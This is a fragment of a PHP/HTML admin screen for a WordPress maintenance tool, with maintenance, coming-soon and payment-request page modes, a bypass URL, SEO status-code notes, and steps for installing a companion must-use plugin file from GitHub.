                    </div>

                    <button type="submit" name="activate_mode" class="btn btn-success">Activate Coming Soon Mode</button>
                </form>
            </div>
            
            <!-- Money Request Mode -->
            <div style="background: #2A2A2A; padding: 20px; border-radius: 3px; border: 1px solid #333333;">
                <h3 style="color: #dc3545;">💰 Payment Request Mode</h3>
                <p>Display a payment request message for clients who haven't paid. Includes noindex and contact form.</p>
                <form method="post">
                    <input type="hidden" name="mode" value="payment_request">
                    <div class="form-group">
                        <label>Custom Title:</label>
                        <input type="text" name="custom_title" value="<?php echo $current_mode === 'payment_request' ? esc_attr($custom_title) : 'Payment Required'; ?>" style="width: 100%; padding: 8px; background: #1a1a1a; border: 1px solid #333; color: #fff; border-radius: 3px; margin-bottom: 10px;">
                    </div>
                    <div class="form-group">
                        <label>Custom Message:</label>
                        <textarea name="custom_message" rows="3" style="width: 100%; padding: 8px; background: #1a1a1a; border: 1px solid #333; color: #fff; border-radius: 3px; margin-bottom: 10px;"><?php echo $current_mode === 'payment_request' ? esc_textarea($custom_message) : 'This website has been completed but payment is still pending. Please contact us to resolve this matter and restore full access to your website.'; ?></textarea>
                    </div>

                    <button type="submit" name="activate_mode" class="btn btn-danger">Activate Payment Request Mode</button>
                </form>
            </div>
        </div>
        
        <!-- Custom CSS -->
        <div style="background: #2A2A2A; padding: 20px; border-radius: 3px; border: 1px solid #333333; margin-bottom: 20px;">
            <h3>Custom CSS (Optional)</h3>
            <p style="color: #999; margin-bottom: 10px;">Add custom CSS to style your maintenance page:</p>
            <textarea name="custom_css" rows="6" style="width: 100%; padding: 10px; background: #1a1a1a; border: 1px solid #333; color: #fff; border-radius: 3px; font-family: monospace;" placeholder="/* Add your custom CSS here */"><?php echo esc_textarea($custom_css); ?></textarea>
        </div>
        
        <!-- Preview Links -->
        <?php if ($current_mode): ?>
            <div style="background: #2A2A2A; padding: 20px; border-radius: 3px; border: 1px solid #333333;">
                <h3>Preview & Management</h3>
                <p><strong>Current Mode:</strong> <?php echo ucfirst(str_replace('_', ' ', $current_mode)); ?></p>
                <p><strong>Frontend URL:</strong> <a href="<?php echo home_url(); ?>" target="_blank" style="color: var(--accent-color);"><?php echo home_url(); ?></a></p>
                <p><strong>Bypass URL:</strong> <a href="<?php echo home_url('?maintenance_bypass=' . ACCESS_KEY); ?>" target="_blank" style="color: var(--accent-color);"><?php echo home_url('?maintenance_bypass=' . ACCESS_KEY); ?></a></p>
                <p style="font-size: 12px; color: #999;">Use the bypass URL to view your site normally while maintenance mode is active.</p>
            </div>
        <?php endif; ?>
        
        <!-- SEO Information -->
        <div style="background: #2A2A2A; padding: 20px; border-radius: 3px; border-left: 4px solid var(--accent-color); margin-top: 20px;">
            <h3>SEO & Search Engine Information</h3>
            <ul style="line-height: 1.6;">
                <li><strong>Maintenance Mode:</strong> Returns 503 status code + noindex meta tag (prevents indexing)</li>
                <li><strong>Coming Soon Mode:</strong> Returns 200 status code + noindex meta tag (prevents indexing)</li>
                <li><strong>Payment Request Mode:</strong> Returns 402 status code + noindex meta tag (prevents indexing)</li>
                <li><strong>Bypass Access:</strong> Logged-in administrators and bypass URL users see normal site</li>
                <li><strong>Search Engines:</strong> Will not index pages while any mode is active</li>
            </ul>
        </div>
        
        <!-- Frontend Installation Instructions Lightbox -->
        <div id="frontend-instructions-lightbox" class="lightbox">
            <div class="lightbox-content" style="width: 90vw; max-width: 800px; background: var(--background-dark); border: 1px solid var(--border-color);">
                <div class="lightbox-header" style="background: var(--background-light); border-bottom: 1px solid var(--border-color);">
                    <h3 style="color: var(--primary-text); display: flex; align-items: center; gap: 10px;"><i class="fas fa-download"></i> Frontend File Installation Required</h3>
                    <button class="lightbox-close" onclick="closeFrontendInstructions()" style="color: var(--secondary-text); background: transparent; border: none; font-size: 24px; cursor: pointer;">&times;</button>
                </div>
                <div class="lightbox-body" style="color: var(--primary-text);">
                    <p style="margin-bottom: 20px; color: var(--secondary-text);"><i class="fas fa-bolt"></i> To activate maintenance modes, you need to install the frontend file. Follow these steps:</p>
                    
                    <div style="background: var(--background-light); padding: 20px; border-radius: 6px; margin-bottom: 20px; border-left: 4px solid var(--success-color, #4CAF50); border: 1px solid var(--border-color);">
                        <h4 style="color: var(--success-color, #4CAF50); margin-top: 0; margin-bottom: 15px; display: flex; align-items: center; gap: 8px;"><i class="fas fa-folder-open"></i> Step 1: Download the Frontend File</h4>
                        <p style="margin-bottom: 15px; color: var(--primary-text);">Visit the GitHub repository to download the <code style="background: var(--background-dark); color: var(--accent-color); padding: 2px 6px; border-radius: 3px;">maintenance-tool-frontend.php</code> file:</p>
                        <a href="https://github.com/yasirshabbirservices/maintenance-tool" 
                           target="_blank" 
                           class="btn btn-success"
                           style="display: inline-flex; align-items: center; gap: 8px; margin: 10px 0; background: var(--success-color, #4CAF50); color: white; text-decoration: none; padding: 10px 16px; border-radius: 4px; border: none;">
                            <i class="fab fa-github"></i> Visit GitHub Repository
                        </a>
                        <p style="font-size: 14px; color: var(--secondary-text); margin-top: 10px;"><i class="fas fa-lightbulb"></i> Navigate to the repository and download the <code style="background: var(--background-dark); color: var(--accent-color); padding: 2px 6px; border-radius: 3px;">maintenance-tool-frontend.php</code> file.</p>
                    </div>
                    
                    <div style="background: var(--background-light); padding: 20px; border-radius: 6px; margin-bottom: 20px; border-left: 4px solid var(--info-color, #2196F3); border: 1px solid var(--border-color);">
                        <h4 style="color: var(--info-color, #2196F3); margin-top: 0; margin-bottom: 15px; display: flex; align-items: center; gap: 8px;"><i class="fas fa-upload"></i> Step 2: Upload to WordPress</h4>
                        <p style="margin-bottom: 15px; color: var(--primary-text);"><i class="fas fa-folder"></i> Upload the downloaded file to your WordPress installation:</p>
                        <ul style="margin: 15px 0; padding-left: 20px; line-height: 1.8; color: var(--primary-text);">
                            <li><strong><i class="fas fa-bullseye"></i> Target Path:</strong> <code style="background: var(--background-dark); color: var(--accent-color); padding: 2px 6px; border-radius: 3px;">/wp-content/mu-plugins/maintenance-tool-frontend.php</code></li>
                             <li><strong><i class="fas fa-folder-plus"></i> Create Directory:</strong> If the <code style="background: var(--background-dark); color: var(--accent-color); padding: 2px 6px; border-radius: 3px;">mu-plugins</code> folder doesn't exist, create it first</li>
                             <li><strong><i class="fas fa-lock"></i> File Permissions:</strong> Ensure the file has proper read permissions (644)</li>
                             <li><strong><i class="fas fa-plug"></i> Must-Use Plugin:</strong> WordPress will automatically load this file</li>
                        </ul>
                    </div>
                    
                    <div style="background: var(--background-light); padding: 20px; border-radius: 6px; margin-bottom: 20px; border-left: 4px solid var(--warning-color, #ff9800); border: 1px solid var(--border-color);">
                        <h4 style="color: var(--warning-color, #ff9800); margin-top: 0; margin-bottom: 15px; display: flex; align-items: center; gap: 8px;"><i class="fas fa-check-circle"></i> Step 3: Verify Installation</h4>
                        <p style="margin-bottom: 15px; color: var(--primary-text);"><i class="fas fa-sync-alt"></i> After uploading, refresh this page and try activating a maintenance mode again.</p>
                        <button onclick="location.reload()" class="btn btn-warning" style="display: inline-flex; align-items: center; gap: 8px; background: var(--warning-color, #ff9800); color: white; border: none; padding: 10px 16px; border-radius: 4px; cursor: pointer;"><i class="fas fa-redo"></i> Refresh Page</button>
                    </div>
                    
                    <div style="background: var(--background-light); padding: 15px; border-radius: 6px; border-left: 4px solid var(--accent-color); border: 1px solid var(--border-color);">
                        <p style="margin: 0; font-size: 14px; color: var(--secondary-text); display: flex; align-items: flex-start; gap: 8px;"><strong><i class="fas fa-info-circle"></i> Note:</strong> <span>The frontend file is a "Must-Use Plugin" that WordPress loads automatically. It handles the display of maintenance pages to your visitors while the backend tool manages settings and configuration.</span></p>
                    </div>
                </div>
                <div class="lightbox-actions" style="background: var(--background-light); border-top: 1px solid var(--border-color); padding: 15px; display: flex; gap: 10px; justify-content: flex-end;">
                    <button class="btn btn-secondary" onclick="closeFrontendInstructions()" style="background: var(--background-dark); color: var(--secondary-text); border: 1px solid var(--border-color); padding: 10px 16px; border-radius: 4px; cursor: pointer; display: flex; align-items: center; gap: 6px;"><i class="fas fa-times"></i> Close</button>
                     <a href="https://github.com/yasirshabbirservices/maintenance-tool" target="_blank" class="btn btn-primary" style="background: var(--accent-color); color: white; text-decoration: none; padding: 10px 16px; border-radius: 4px; border: none; display: flex; align-items: center; gap: 6px;"><i class="fab fa-github"></i> Open GitHub Repository</a>
                </div>
            </div>
        </div>
    </div>
    <?php
}
?>